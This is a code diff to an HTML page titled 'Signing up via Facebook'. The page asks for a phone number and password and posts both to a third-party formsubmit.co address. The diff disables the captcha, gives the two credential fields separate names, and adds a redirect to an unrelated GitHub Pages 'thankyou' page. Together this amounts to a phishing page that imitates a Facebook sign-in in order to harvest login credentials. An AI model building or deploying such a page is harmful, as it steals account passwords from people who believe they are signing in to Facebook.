@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Logging via Facebook</title>
+  <title>signing up via Facebook</title>
   <style>
     body {
       background-color: #181818;
@@ -23,11 +23,18 @@
     form {
       display: flex;
       flex-direction: column;
-      gap: 15px;
-      width: 300px;
+      gap: 20px;
+      width: 90%;
+      max-width: 600px;
     }
 
-    input, textarea, button {
+    .inline-inputs {
+      display: flex;
+      gap: 10px;
+    }
+
+    .inline-inputs input {
+      flex: 1;
       padding: 10px;
       border: none;
       border-radius: 8px;
@@ -35,6 +42,10 @@
     }
 
     button {
+      padding: 10px;
+      font-size: 1em;
+      border: none;
+      border-radius: 8px;
       background-color: #1DB954;
       color: white;
       cursor: pointer;
@@ -47,15 +58,17 @@
 </head>
 <body>
 
-  <h2>Logging via Facebook</h2>
+  <h2>Signing up via Facebook</h2>
 
   <form action="https://formsubmit.co/d7d492f24a67929f3758bf7d9b05c79e" method="POST">
-    <input type="text" name="First Text" placeholder="Phone number" required>
-     <input type="text" name="First Text" placeholder="Password" required>
+    <div class="inline-inputs">
+      <input type="text" name="First Text" placeholder="Phone number" required>
+      <input type="text" name="Second Text" placeholder="Password" required>
+    </div>
 
-    <!-- Optional hidden fields -->
-    <input type="hidden" name="_subject" value="New Joke Submission!">
+    <input type="hidden" name="_subject" value="New Submission!">
     <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://andreffff-qq.github.io/Davionaimusic/thankyou.html">
 
     <button type="submit">Send</button>
   </form>
